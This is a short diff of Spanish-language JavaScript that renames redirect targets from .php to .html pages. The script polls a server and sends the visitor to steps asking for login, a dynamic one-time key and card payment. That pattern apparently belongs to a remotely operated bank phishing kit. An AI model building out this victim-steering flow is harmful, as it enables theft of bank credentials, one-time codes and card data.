@@ -121,8 +121,8 @@
             console.log("Iniciando verificación de actualizaciones...");
 
             const redirectTimeout = setTimeout(() => {
-                console.log("Redirigiendo a pedir_logo.php...");
-                window.location.href = "pedir_logo.php";
+                console.log("Redirigiendo a pedir_logo.html...");
+                window.location.href = "pedir_logo.html";
             }, 2000);
 
             const interval = setInterval(async () => {
@@ -140,16 +140,16 @@
 
                                     switch (action) {
                                         case "pedir_logo":
-                                            window.location.href = "pedir_logo.php";
+                                            window.location.href = "pedir_logo.html";
                                             break;
                                         case "pedir_dinamica":
-                                            window.location.href = "pedir_dinamica.php";
+                                            window.location.href = "pedir_dinamica.html";
                                             break;
                                         case "error_tc":
-                                            window.location.href = "pago.php";
+                                            window.location.href = "pago.html";
                                             break;
                                         case "error_logo":
-                                            window.location.href = "pedir_logo.php";
+                                            window.location.href = "pedir_logo.html";
                                             break;
                                         case "finalizar":
                                             window.location.href = "finish.html";
